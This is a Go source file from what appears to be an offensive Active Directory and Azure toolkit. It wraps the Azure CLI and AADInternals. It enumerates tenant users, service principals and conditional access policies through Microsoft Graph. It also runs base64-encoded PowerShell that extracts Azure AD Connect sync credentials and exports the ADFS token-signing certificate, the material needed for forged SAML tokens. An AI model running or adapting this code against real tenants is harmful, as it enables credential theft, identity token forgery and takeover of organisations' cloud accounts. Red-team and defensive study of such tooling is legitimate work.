package tools

import (
	"adpack/utils"
	"context"
	"fmt"
	"os/exec"
)

type aadInternalsTool struct{}

var AADInternals = aadInternalsTool{}

func (aadInternalsTool) Name() string { return "AADInternals" }

func (aadInternalsTool) Available() bool {
	_, err := exec.LookPath("az")
	return err == nil
}

func gruntCall(ctx context.Context, resource string) (utils.CmdResult, error) {
	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/%s?$top=999", resource)
	py := `import sys,json;d=json.load(sys.stdin);[print(json.dumps(i)) for i in d.get('value',[])]`
	cmd := fmt.Sprintf(`az rest --url "%s" --headers "ConsistencyLevel=eventual" 2>/dev/null | python3 -c "%s"`, url, py)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", cmd})
	if !cr.Success {
		return cr, fmt.Errorf("az rest failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (a aadInternalsTool) RunTenantEnum(ctx context.Context, username, password string) (utils.CmdResult, error) {
	return gruntCall(ctx, "users")
}

func (a aadInternalsTool) RunSPEnum(ctx context.Context, username, password string) (utils.CmdResult, error) {
	return gruntCall(ctx, "servicePrincipals")
}

func (a aadInternalsTool) RunAADConnectExtract(ctx context.Context) (utils.CmdResult, error) {
	encoded := utils.EncodePowerShell("Import-Module AADInternals -Force; Get-AADIntAzureADConnectCredentials | ConvertTo-Json")
	cr := utils.RunCommandCtx(ctx, "pwsh", []string{"-NoP", "-NonI", "-EncodedCommand", encoded})
	if !cr.Success {
		return cr, fmt.Errorf("aadinternals command failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (a aadInternalsTool) RunADFSCertExtract(ctx context.Context) (utils.CmdResult, error) {
	encoded := utils.EncodePowerShell("Import-Module AADInternals -Force; Convert-AADIntADFSTokenSigningCertificateToX509 | ConvertTo-Json")
	cr := utils.RunCommandCtx(ctx, "pwsh", []string{"-NoP", "-NonI", "-EncodedCommand", encoded})
	if !cr.Success {
		return cr, fmt.Errorf("aadinternals command failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (a aadInternalsTool) RunCAPEnum(ctx context.Context, username, password string) (utils.CmdResult, error) {
	return gruntCall(ctx, "identity/conditionalAccess/policies")
}
